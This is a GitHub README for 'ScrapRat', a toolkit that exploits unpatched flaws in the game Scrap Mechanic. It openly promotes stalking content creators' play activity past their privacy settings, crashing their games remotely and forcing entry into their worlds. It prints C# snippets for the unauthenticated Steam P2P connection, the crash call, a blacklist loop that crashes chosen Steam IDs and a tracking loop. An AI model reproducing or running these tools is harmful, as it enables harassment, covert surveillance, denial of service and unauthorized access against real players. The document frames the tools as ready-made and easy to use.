# Welcome to the ScrapRat repo!
### What is this??
This is a collection of software, code snippets, sample cli's, and demonstrations outlining different impactful CWE's that are currently available to exploit in [Scrap Mechanic](https://www.scrapmechanic.com/) as of 3/21/2024.
As some of you may know, Scrap Mechanic is a wonderful game with plentiful updates and it should come as no surprise as to why these CWE critical vulnerabilities exist in the game and why they will likely continue to exist for the foreseeable future.

Some of the things the CWE's allow for include `cyber stalking`, `remote game crashing`, and `unauthorized world entry`.

Thats right! Have you ever wanted to know when exactly your favorite content creators are playing Scrap Mechanic?
Well now you can forcefully track their Scrap Mechanic activity without their knowledge even if their steam profile is on maximum privacy and they are always 'offline'.

Why stop there? Maybe you get sick and tired of the Scrap Mechanic content..?
Well have I got some new for you! With just a few clicks, their game wont last half a second before crashing! This means no more of that oh so stinky Scrap Mechanic content.

Now, if thats not your cup of tea I've got one last option for you (my personal favorite). In just (on average) 15 minutes, you will have cracked the code and you will be able to join ANY of your favorite content creators when you use the previous cyber stalking tool to find out when they are playing the game. Now you can play with your favorite content creators!

#
Now, back to business...

This repository implements the follow CWE's:

- [x] [CWE-306](https://cwe.mitre.org/data/definitions/306.html) under [Player-GetConnection#L74-L76](https://github.com/TheGuy920/ScrapRat/blob/main/ScrapRat/Player/Player.cs#L74-L76)
```csharp
internal HSteamNetConnection GetConnection() =>
this.hSteamNetConnection ??= (HSteamNetConnection)this.Interupt.RunCancelable(() => 
SteamNetworkingSockets.ConnectP2P
    (ref this.NetworkingIdentity, 0, LongTimeoutOptions.Length, LongTimeoutOptions));
```
With additional parameters under [LongTimeoutOptions#L137-L150](https://github.com/TheGuy920/Crashbot/blob/main/ScrapRat/Player/Player.cs#L137-L150)
```csharp
private static readonly SteamNetworkingConfigValue_t[] LongTimeoutOptions = [
    new SteamNetworkingConfigValue_t
    {
        m_eDataType = ESteamNetworkingConfigDataType.k_ESteamNetworkingConfig_Int32,
        m_eValue = ESteamNetworkingConfigValue.k_ESteamNetworkingConfig_TimeoutConnected,
        m_val = new SteamNetworkingConfigValue_t.OptionValue { m_int32 = 500 }
    },
    new SteamNetworkingConfigValue_t
    {
        m_eDataType = ESteamNetworkingConfigDataType.k_ESteamNetworkingConfig_Int32,
        m_eValue = ESteamNetworkingConfigValue.k_ESteamNetworkingConfig_TimeoutInitial,
        m_val = new SteamNetworkingConfigValue_t.OptionValue { m_int32 = int.MaxValue }
    }
];
```
- [x] [CWE-476](https://cwe.mitre.org/data/definitions/476.html) under [Blacklist#L143](https://github.com/TheGuy920/ScrapRat/blob/main/ScrapRat/Blacklist/MechanicNoMore.cs#L143)
```csharp
SteamNetworkingSockets.SendMessageToConnection(connection, 0, 0, 0, out long _);
```
- [ ] [CWE-208](https://cwe.mitre.org/data/definitions/208.html) Comming Soon :tm: under [SkeletonKey](https://commingsoon)

- [ ] [CWE-307](https://cwe.mitre.org/data/definitions/307.html) Comming Soon :tm: under [SkeletonKey](https://commingsoon)


# Projects
The CWE's above have been implemented in a few different and easy to use solutions. 
* [Blacklist](https://github.com/TheGuy920/ScrapRat/blob/main/ScrapRat/Game.cs#L58)
* [Spy Tool](https://github.com/TheGuy920/ScrapRat/blob/main/ScrapRat/Game.cs#L28)
* [Passphrase Timing Attack](https://github.com/TheGuy920/ScrapRat/blob/main/ScrapRat/Game.cs#L88)

### ScrapRatCli [-->](https://github.com/TheGuy920/ScrapRat/blob/main/ScrapRatCli/Program.cs#L88)
A sample cli has been created demonstrating how to use the Blacklisting feature
```csharp
foreach (ulong sid in steamids)
    Game.Blacklist.Add(sid, true);
```

### ScrapRatWebApi [-->](https://github.com/TheGuy920/ScrapRat/blob/main/ScrapRatCli/Program.cs#L88)
A sample WebApi has been created showcasing the cyber stalking capabilities
```csharp
foreach (var steamid in PeopleToTrack)
{
    MagnifiedMechanic mechanic = Game.BigBrother.SpyOnMechanic(steamid);
    mechanic.PlayerLoaded += _ =>
        Console.WriteLine($"[{DateTime.Now}] Player '{mechanic.Name}' ({mechanic.SteamID}) is loaded.");
    mechanic.OnUpdate += evnt =>
        Console.WriteLine($"[{DateTime.Now}] Player '{mechanic.Name}' ({mechanic.SteamID}) is {evnt}");
}
```
